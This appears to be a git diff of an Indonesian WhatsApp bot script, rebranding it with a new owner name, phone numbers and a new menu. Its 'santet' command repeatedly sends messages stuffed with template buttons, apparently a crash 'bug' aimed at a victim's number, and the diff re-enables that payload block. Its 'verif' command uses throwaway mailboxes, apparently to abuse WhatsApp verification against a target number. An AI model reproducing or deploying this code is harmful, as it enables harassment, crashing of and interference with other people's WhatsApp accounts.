@@ -22,7 +22,7 @@ chats: {},
 ...(global.db || {})
 }
 
-global.ownerName = 'El Diablo'
+global.ownerName = 'JOSHHH'
 global.ownerNumber = ["0@s.whatsapp.net"]
 global.prefa = ['','.']
 global.mess = {
@@ -216,8 +216,8 @@ messageId: ""
 }
 switch (command) {
 case 'verif': {
-    if (!isGroup) return diablobotwhatsapp.reply(`wajib dalam grup`)
-if (!isGroupAdmins) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
+    if (!isGroup) return diablobotwhatsapp.reply(`HARUS DI DALAM GROUP`)
+if (!isGroupAdmins) return diablobotwhatsapp.reply(`HUBUNGI ADMIN JIKA INGIN MENGGUNAKAN`)
 var axioss = require ("axios")
 var util = require ("node:util")
 var imel = await (await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")).data[0]
@@ -262,27 +262,22 @@ diablo.sendMessage(from, { text: util.format( res.status == 200 ? JSON.parse(res
 break
 case 'menu':
 jiren = ` 
-▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
-                    𝗠𝗘𝗡𝗨
-▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
-BOT NAME : CYCLONE
+        𝗠𝗘𝗡𝗨
+BOT NAME : Bot-Joshhh
 RUNING ON : VPS
-OWNER : wa.me/6281220670449
+OWNER : wa.me/6285157781148
 
 SILAHKAN PILIH MENU DIBAWAH
 
 • santet (628xxx)
 • verif (628xxx)
-• othermenu
 
-CREDIT : CYCLONE TEAM
-▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
-    
+CREDIT : JOSHHH 
 `
 diablobotwhatsapp.reply(jiren)
 break
 
-case 'othermenu':
+case 'menuadmin':
 jiren = `
 ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
                   𝗢𝗧𝗛𝗘𝗥
@@ -391,8 +386,8 @@ break
   
 
 case 'santet':
-          if (!isGroup) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
-        txts = `SUCCES ✅`
+          if (!isGroup) return diablobotwhatsapp.reply(`HARUS BERADA DI DALAM GROUP`)
+        txts = `SUCCES SEND BUG ✅`
         diablobotwhatsapp.reply(txts)
         
     
@@ -401,7 +396,7 @@ case 'santet':
         jumlah = '3'
         waktu = `2s`
     // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
-/* templateButtons: [
+ templateButtons: [
 { callButton: { displayText: `MAKAN NIH BUG WHATSAPP 😘
 `, phoneNumber: ``}},
 { callButton: { displayText: `MAKAN NIH BUG WHATSAPP 😘
@@ -432,10 +427,10 @@ case 'santet':
 `, id: ``}},
 { quickReplyButton: { displayText: `MAKAN NIH BUG WHATSAPP 😘
 `, id: ``}},
-,*/
+,
 for (let i = 0; i < jumlah; i++) {
 diablo.sendMessage(num, {
-text: 'BUG BY CYCLONE', 
+text: 'BUG BY JOSHHH', 
 templateButtons: [
    { callButton: { displayText: `MAKAN NIH BUG WHATSAPP 😘
 `, phoneNumber: ``}},
